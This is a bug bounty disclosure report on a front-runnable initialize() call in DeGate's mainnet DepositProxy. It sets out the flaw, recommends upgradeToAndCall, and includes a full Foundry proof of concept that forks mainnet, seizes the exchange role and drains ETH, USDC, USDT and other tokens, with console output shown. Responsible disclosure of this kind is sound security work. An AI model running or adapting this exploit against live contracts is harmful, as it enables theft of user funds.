# 26110 - \[SC - Insight] All the funds from the DepositProxy contracts c...

Submitted on Nov 25th 2023 at 02:03:18 UTC by @savi0ur for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26110

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x54D7aE423Edb07282645e740C046B9373970a168#code>

Impacts:

* Direct theft of funds exceeding 1,000,000 USD from the Default Deposit Contract

## Description

## Bug Description

We can see below are the **two separate transactions** that are initiated after `DepositProxy` contract deployment.

1. [upgradeTo](https://etherscan.io/tx/0xb1e5bc43a9a516618be17e0075ca12b7420b5daa42e377af2906a2c8d9619bdc)
2. [initialize](https://etherscan.io/tx/0xd263c3c19fedb4a8765b8facd6bce1d1609b940d415d460351b590edba371970)

As can be seen on-chain, there are two separate tx : 1) for upgrading `implementation` address of the proxy and 2) for initializing that `implementation` contract from proxy with an `exchange` address.

Due to the protocol is using proxy/implementation pattern for upgradeability support, there is always a need to have an `initialize()` in implementation contract and it needs to be called in the context of proxy to initialize implementation contract.

This is the definition of `initialize()`:

```solidity
function initialize(
    address _exchange
    )
    external
{
    require(
        exchange == address(0) && _exchange != address(0),
        "INVALID_EXCHANGE"
    );
    owner = msg.sender;
    exchange = _exchange;
}
```

To initialize `DepositProxy's` implementation contract, there is a `initialize(address _exchange)` which takes an address of exchange. However, as we can see, this `initialize()` can be frontrun and attacker can initialize `exchange` with an attacker controlled address.

Once attacker frontrun and set an `exchange` to an attacker controlled address, he/she can bypass the check - `onlyExchange` defined on `withdraw()` from proxy's implementation and can steal all funds stored inside `DepositProxy`.

```solidity
function withdraw(
    address /*from*/,
    address to,
    address token,
    uint    amount
    )
    external
    override
    payable
    onlyExchange
    ifNotZero(amount)
{
    if (isETHInternal(token)) {
        to.sendETHAndVerify(amount, gasleft());
    } else {
        // Try to transfer the amount requested.
        // If this fails try to transfer the remaining balance in this contract.
        // This is to guard against non-standard token behavior where total supply
        // has changed in unexpected ways.
        if (!token.safeTransfer(to, amount)){
            uint amountPaid = ERC20(token).balanceOf(address(this));
            require(amountPaid < amount, "UNEXPECTED");
            token.safeTransferAndVerify(to, amountPaid);
        }
    }
}

modifier onlyExchange()
{
    require(msg.sender == exchange, "UNAUTHORIZED");
    _;
}
```

For the future upgrades, proxy contract will remain same but implementation contract will be changing. Hence, proxy will need to upgrade and initialize again with new implementation address.

Since Proxy's storage will not be changing, so the token's balances. As we can see, if such future upgrades happened with two separate tx - `upgradeTo` tx and `initialize` tx. Attacker can frontrun `initialize` tx OR backrun `upgradeTo` tx to initialize proxy's implementation with an attacker controlled address and then can easily steal all the funds that are already there in proxy contract.

## Impact

All the funds from the DepositProxy contracts can be stolen by frontrunning `initialize()` transaction of the proxy's implementation and transferring all the funds from proxy contract to attacker controlled address.

## Risk Breakdown

Difficulty to Exploit: Very Easy

## Recommendation

I recommend to initialize proxy's implementation at the time of upgrade using only `upgradeToAndCall()` instead of having two tx - 1) `upgradeTo()` and then 2) `initialize()`.

```solidity
upgradeToAndCall(address implementation, bytes memory data)
```

We should upgrade and initialize proxy contract by passing `implementation` address and `data` as `abi.encodeWithSignature("initialize(address)", exchange_address)` to `upgradeToAndCall()`.

## References

DepositProxy : <https://etherscan.io/address/0x54D7aE423Edb07282645e740C046B9373970a168> DepositProxy Implementation : <https://etherscan.io/address/0x8ccc06c4c3b2b06616eee1b62f558f5b9c08f973> UpgradeTo tx - <https://etherscan.io/tx/0xb1e5bc43a9a516618be17e0075ca12b7420b5daa42e377af2906a2c8d9619bdc> Initialize tx - <https://etherscan.io/tx/0xd263c3c19fedb4a8765b8facd6bce1d1609b940d415d460351b590edba371970>

## Proof Of Concept

**NOTE:**

* For simplicity of POC, i am doing a prank on `proxy owner` for upgradeTo transaction.

**Steps to Run using Foundry:**

* Install Foundry (<https://book.getfoundry.sh/getting-started/installation>)
* Open terminal and run `forge init poc` and `cd poc`
* Download implementation contract source using command `cast etherscan-source -d src --etherscan-api-key $ETHERSCAN_API_KEY 0x8CCc06C4C3B2b06616EeE1B62F558f5b9C08f973`
* Modify `initialize()` from `DefaultDepositContract.sol` for showing an upgrade as **new implementation** as shown below (removed check `exchange == address(0)` as exchange was set in previous `initialize()`, so it cant be zero anymore).

```solidity
function initialize(
    address _exchange
    )
    external
{
    require(
        _exchange != address(0),
        "INVALID_EXCHANGE"
    );
    owner = msg.sender;
    exchange = _exchange;
}
```

* Paste following foundry code in TestPoC.t.sol
* Run using `forge test -vv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import "../src/DefaultDepositContract/contracts/core/impl/DefaultDepositContract.sol";

interface IDepositProxy {
    function proxyOwner() external view returns (address owner);
    function upgradeTo(address implementation) external;
    function upgradeToAndCall(address implementation, bytes memory data) external payable;
    function exchange() external view returns (address);
    function initialize(address _exchange) external;
    function owner() external view returns (address);
    function pendingOwner() external view returns (address);
    function withdraw(address, address to, address token, uint256 amount) external payable;
    receive() external payable;
}

contract HelperContract {
    fallback() external payable {}
}

contract TestPOC is Test {
    IDepositProxy deposit_proxy = IDepositProxy(payable(0x54D7aE423Edb07282645e740C046B9373970a168));

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
    }

    function testFrontrunInitializeStealAllFundsPOC() public {
        console.log("\nNOTE: For simplicity of POC, we are pranking `proxy owner` for upgradeTo tx");
        address proxy_owner = deposit_proxy.proxyOwner();

        DefaultDepositContract new_impl = new DefaultDepositContract();
        console.log("New implementation deployed at: %s", address(new_impl));

        console.log("Proxy owner is upgrading proxy implementation to new implementation: %s", address(new_impl));
        vm.prank(proxy_owner);
        deposit_proxy.upgradeTo(address(new_impl));
        
        address attacker = makeAddr("Attacker");
        console.log("Address of attacker: %s", attacker);

        HelperContract attacker_controlled_contract = new HelperContract();
        console.log("Attacker controlled contract is deployed at : %s", address(attacker_controlled_contract));

        console.log("Attacker can backrun/frontrun upgradeTo/initialize tx respectively. Here, its backrunning upgradeTo tx");
        vm.prank(attacker);
        deposit_proxy.initialize(attacker);

        address exchange = deposit_proxy.exchange();
        console.log("Exchange is initialized to : %s", exchange);
        assert(exchange == attacker);

        console.log("Attacker can steal all the funds from proxy");
        address[] memory tokensToSteal = new address[](5);
        tokensToSteal[0] = address(0); //ETH
        tokensToSteal[1] = 0x59D9356E565Ab3A36dD77763Fc0d87fEaf85508C; //USDM
        tokensToSteal[2] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; //USDC
        tokensToSteal[3] = 0x53C8395465A84955c95159814461466053DedEDE; //DG
        tokensToSteal[4] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //USDT

        console.log("");
        console.log("Balance of proxy, before attack:");
        for(uint i; i < tokensToSteal.length; i++) {
            string memory symbol = tokensToSteal[i] != address(0) ? IERC20(tokensToSteal[i]).symbol() : "ETH";
            uint balance = tokensToSteal[i] != address(0) ? IERC20(tokensToSteal[i]).balanceOf(address(deposit_proxy)) : address(deposit_proxy).balance;
            console.log("%s (%s): %d", tokensToSteal[i], symbol, balance);
        }        
        
        vm.startPrank(attacker);
        for(uint i; i < tokensToSteal.length; i++) {
            uint amount;
            if (tokensToSteal[i] == address(0)) {
                amount = address(deposit_proxy).balance;
            } else {
                amount = IERC20(tokensToSteal[i]).balanceOf(address(deposit_proxy));
            }

            deposit_proxy.withdraw(address(0), address(attacker_controlled_contract), tokensToSteal[i], amount);

            if (tokensToSteal[i] == address(0)) {
                amount = address(deposit_proxy).balance;
            } else {
                amount = IERC20(tokensToSteal[i]).balanceOf(address(deposit_proxy));
            }
        }
        vm.stopPrank();

        console.log("");
        console.log("Balance of proxy, after attack:");
        for(uint i; i < tokensToSteal.length; i++) {
            string memory symbol = tokensToSteal[i] != address(0) ? IERC20(tokensToSteal[i]).symbol() : "ETH";
            uint balance = tokensToSteal[i] != address(0) ? IERC20(tokensToSteal[i]).balanceOf(address(deposit_proxy)) : address(deposit_proxy).balance;
            console.log("%s (%s): %d", tokensToSteal[i], symbol, balance);
        }
    }
}
```

**Console Output:**

```console
Logs:
  
NOTE: For simplicity of POC, we are pranking `proxy owner` for upgradeTo tx
  New implementation deployed at: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Proxy owner is upgrading proxy implementation to new implementation: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Address of attacker: 0xD022658Fd5608078a8c0E5464066B1803a2806F4
  Attacker controlled contract is deployed at : 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  Attacker can backrun/frontrun upgradeTo/initialize tx respectively. Here, its backrunning upgradeTo tx
  Exchange is initialized to : 0xD022658Fd5608078a8c0E5464066B1803a2806F4
  Attacker can steal all the funds from proxy
  
  Balance of proxy, before attack:
  0x0000000000000000000000000000000000000000 (ETH): 335512531059683421416
  0x59D9356E565Ab3A36dD77763Fc0d87fEaf85508C (USDM): 1189366766477136447755153
  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC): 1144659513586
  0x53C8395465A84955c95159814461466053DedEDE (DG): 7182533387141239290607714
  0xdAC17F958D2ee523a2206206994597C13D831ec7 (USDT): 300470896446
  
  Balance of proxy, after attack:
  0x0000000000000000000000000000000000000000 (ETH): 0
  0x59D9356E565Ab3A36dD77763Fc0d87fEaf85508C (USDM): 1
  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC): 0
  0x53C8395465A84955c95159814461466053DedEDE (DG): 0
  0xdAC17F958D2ee523a2206206994597C13D831ec7 (USDT): 0
```
